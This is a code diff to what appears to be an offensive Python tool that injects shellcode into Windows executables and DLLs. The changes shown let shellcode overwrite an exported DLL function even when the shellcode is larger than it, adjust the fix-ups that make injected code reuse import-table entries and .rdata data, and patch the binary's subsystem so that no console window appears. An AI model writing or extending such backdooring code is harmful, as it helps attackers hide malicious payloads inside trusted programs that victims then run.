@@ -62,13 +62,13 @@ def inject_exe(main_shc: bytes, settings: Settings, carrier: Carrier):
 
     # Special case: DLL exported function direct overwrite
     if superpe.is_dll() and settings.dllfunc != "" and carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
-        logger.info("---[ Inject DLL: Overwrite exported function {} with shellcode".format(settings.dllfunc))
+        logger.warn("---[ Inject DLL: Overwrite exported function {} with shellcode".format(settings.dllfunc))
         rva = superpe.getExportEntryPoint(settings.dllfunc)
 
         # Size and sanity checks
         function_size = superpe.get_size_of_exported_function(settings.dllfunc)
         if shellcode_len >= function_size:
-            raise Exception("Shellcode too large: {} > {} exported function {}".format(
+            logger.warn("Shellcode larger than function: {} > {} exported function {}".format(
                 shellcode_len, function_size, settings.dllfunc
             ))
 
@@ -121,11 +121,11 @@ def inject_exe(main_shc: bytes, settings: Settings, carrier: Carrier):
                     addr))
                 function_backdoorer.backdoor_function(addr, shellcode_rva, shellcode_len)
 
-        if source_style == FunctionInvokeStyle.iat_reuse:
-            logger.info("--( Fix shellcode to re-use IAT entries")
-            injected_fix_iat(superpe, carrier)
-        logger.info("--( Fix shellcode to reference data stored in .rdata")
-        injected_fix_data(superpe, carrier)
+    if source_style == FunctionInvokeStyle.iat_reuse:
+        logger.info("--( Fix shellcode to re-use IAT entries")
+        injected_fix_iat(superpe, carrier)
+    logger.info("--( Fix shellcode to reference data stored in .rdata")
+    injected_fix_data(superpe, carrier)
 
     # changes from console to UI (no console window) if necessary
     superpe.patch_subsystem()
@@ -186,8 +186,9 @@ def injected_fix_data(superpe: SuperPe, carrier: Carrier):
         string_off = find_first_utf16_string_offset(sect_data_copy)
         if string_off == None:
             raise Exception("Strings not found in .rdata section, abort")
-        if string_off < 100:
-            logging.warn("weird: Strings in .rdata section at offset {} < 100".format(string_off))
+        if string_off < 128:
+            logging.debug("weird: Strings in .rdata section at offset {} < 100".format(string_off))
+            string_off = 128
         rm.add_range(peSection.virt_addr, peSection.virt_addr + string_off)
 
     # Do all .rdata patches
